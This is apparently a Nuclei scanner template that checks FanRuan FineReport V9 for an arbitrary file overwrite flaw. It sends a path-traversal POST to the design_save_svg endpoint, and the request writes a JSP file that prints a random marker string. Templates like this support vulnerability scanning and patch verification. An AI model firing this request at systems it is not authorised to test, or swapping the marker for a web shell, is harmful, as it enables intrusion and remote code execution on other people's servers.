http:
    - matchers:
        - status:
            - 200
          type: status
        - part: body
          type: word
          words:
            - '{{randstr}}'
      matchers-condition: and
      payloads:
        path:
            - /seeyonreport/ReportServer
            - /ReportServer
            - /WebReport/ReportServer
      raw:
        - "POST {{path}}?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1\nHost: {{Hostname}} \nContent-Type:text/xml;charset=UTF-8\n\n{\"__CONTENT__\":\"<%out.println(\\\"{{randstr}}\\\");%>\",\"__CHARSET__\":\"UTF-8\"}\n"
      stop-at-first-match: true
id: fanruan-finereport-v9-design-save-svg-fileupload
info:
    author: pphua
    description: 帆软 V9 存在任意文件覆盖，导致攻击者可以任意文件上传
    metadata:
        verified: true
    name: 帆软报表 V9 design_save_svg 任意文件覆盖文件上传
